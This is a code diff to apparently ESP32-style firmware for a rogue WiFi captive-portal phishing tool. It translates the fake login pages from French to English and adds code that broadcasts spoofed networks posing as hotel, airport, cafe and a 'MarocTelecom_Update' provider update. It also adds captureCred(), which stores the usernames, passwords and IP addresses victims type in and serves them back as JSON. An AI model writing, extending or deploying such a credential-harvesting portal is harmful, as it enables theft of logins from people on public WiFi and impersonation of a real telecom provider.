@@ -7,13 +7,15 @@ int capturedCount = 0;
 bool portalActive = false;
 
 PortalStyle portalStyles[] = {
-  {"wifi_login", "WiFi Login",         "Connectez-vous au reseau",  "\xF0\x9F\x93\xB6", "#2563eb", "linear-gradient(135deg,#1e40af,#3b82f6)", "Email / Telephone", "Mot de passe", "WiFi-Free"},
-  {"hotel",      "Hotel WiFi",         "Acces Internet",            "\xF0\x9F\x8F\xA8", "#059669", "linear-gradient(135deg,#065f46,#10b981)", "Numero de chambre", "Nom complet", "Hotel_WiFi"},
-  {"isp_update", "Mise a jour operateur","Configuration requise",   "\xF0\x9F\x94\xA7", "#d97706", "linear-gradient(135deg,#92400e,#f59e0b)", "Identifiant", "Mot de passe", "MarocTelecom_Update"},
-  {"airport",    "Aeroport WiFi",      "Connexion gratuite",        "\xE2\x9C\x88\xEF\xB8\x8F", "#7c3aed", "linear-gradient(135deg,#5b21b6,#8b5cf6)", "Email", "Numero de vol", "Airport_Free"},
-  {"cafe",       "Cafe WiFi",          "Connexion gratuite",        "\xE2\x98\x95", "#ea580c", "linear-gradient(135deg,#9a3412,#f97316)", "Email", "Telephone", "Cafe_Free"}
+  {"wifi_login", "WiFi Login",         "Connect to the network",     "\xF0\x9F\x93\xB6", "#2563eb", "linear-gradient(135deg,#1e40af,#3b82f6)", "Email / Phone", "Password", "WiFi-Free"},
+  {"hotel",      "Hotel WiFi",         "Internet Access",            "\xF0\x9F\x8F\xA8", "#059669", "linear-gradient(135deg,#065f46,#10b981)", "Room Number", "Full Name", "Hotel_WiFi"},
+  {"isp_update", "Provider Update",    "Configuration Required",     "\xF0\x9F\x94\xA7", "#d97706", "linear-gradient(135deg,#92400e,#f59e0b)", "Username", "Password", "MarocTelecom_Update"},
+  {"airport",    "Airport WiFi",       "Free Connection",             "\xE2\x9C\x88\xEF\xB8\x8F", "#7c3aed", "linear-gradient(135deg,#5b21b6,#8b5cf6)", "Email", "Flight Number", "Airport_Free"},
+  {"cafe",       "Cafe WiFi",          "Free Connection",             "\xE2\x98\x95", "#ea580c", "linear-gradient(135deg,#9a3412,#f97316)", "Email", "Phone", "Cafe_Free"}
 };
 const int NUM_PORTAL_STYLES = 5;
+
+static int activeTemplate = 0;
 
 void initCaptivePortal() {
   capturedCount = 0;
@@ -22,16 +24,54 @@ void initCaptivePortal() {
 
 void startCaptivePortal(int templateIdx, const char* customSSID) {
   if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
+  activeTemplate = templateIdx;
   portalActive = true;
   capturedCount = 0;
+
+  // Reconfigure AP SSID if custom name provided
+  if (customSSID && strlen(customSSID) > 0) {
+    WiFi.softAP(customSSID, AP_PASSWORD);
+  } else {
+    WiFi.softAP(portalStyles[templateIdx].defaultSSID, AP_PASSWORD);
+  }
 }
 
 void stopCaptivePortal() {
   portalActive = false;
+  // Restore default AP
+  WiFi.softAP(AP_SSID, AP_PASSWORD);
 }
 
 void clearCreds() {
   capturedCount = 0;
+  // Zero out credential data for security
+  for (int i = 0; i < MAX_CAPTURED_CREDS; i++) {
+    memset(capturedCreds[i].username, 0, sizeof(capturedCreds[i].username));
+    memset(capturedCreds[i].password, 0, sizeof(capturedCreds[i].password));
+  }
+}
+
+bool captureCred(const char* user, const char* pass, const char* ip) {
+  if (capturedCount >= MAX_CAPTURED_CREDS) return false;
+  if (!user || !pass) return false;
+
+  CapturedCred &c = capturedCreds[capturedCount];
+  strncpy(c.username, user, sizeof(c.username) - 1);
+  c.username[sizeof(c.username) - 1] = '\0';
+  strncpy(c.password, pass, sizeof(c.password) - 1);
+  c.password[sizeof(c.password) - 1] = '\0';
+  if (ip) {
+    strncpy(c.ip, ip, sizeof(c.ip) - 1);
+    c.ip[sizeof(c.ip) - 1] = '\0';
+  }
+  c.timestamp = millis();
+  c.portalType = activeTemplate;
+  capturedCount++;
+  return true;
+}
+
+int getActivePortalTemplate() {
+  return activeTemplate;
 }
 
 String getPortalStatusJSON() {
@@ -46,7 +86,7 @@ String getPortalStatusJSON() {
 String getPortalCredsJSON() {
   JsonDocument doc;
   JsonArray arr = doc.to<JsonArray>();
-  for (int i = 0; i < capturedCount; i++) {
+  for (int i = 0; i < capturedCount && i < MAX_CAPTURED_CREDS; i++) {
     JsonObject obj = arr.add<JsonObject>();
     obj["user"] = capturedCreds[i].username;
     obj["pass"] = capturedCreds[i].password;
@@ -91,10 +131,10 @@ String generatePortalHTML(int templateIdx) {
   html += s.userPlaceholder;
   html += "'><input name=password type=password placeholder='";
   html += s.passPlaceholder;
-  html += "'><button type=submit>Se connecter</button></form></div></body></html>";
+  html += "'><button type=submit>Connect</button></form></div></body></html>";
   return html;
 }
 
 String generateSuccessHTML() {
-  return "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f5}.msg{text-align:center}h2{color:#16a34a;font-size:1.5rem}p{color:#6e6e73}</style></head><body><div class=msg><h2>\xE2\x9C\x93 Connexion reussie</h2><p>Vous etes maintenant connecte</p></div></body></html>";
+  return "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f5}.msg{text-align:center}h2{color:#16a34a;font-size:1.5rem}p{color:#6e6e73}</style></head><body><div class=msg><h2>Connected</h2><p>You are now online</p></div></body></html>";
 }
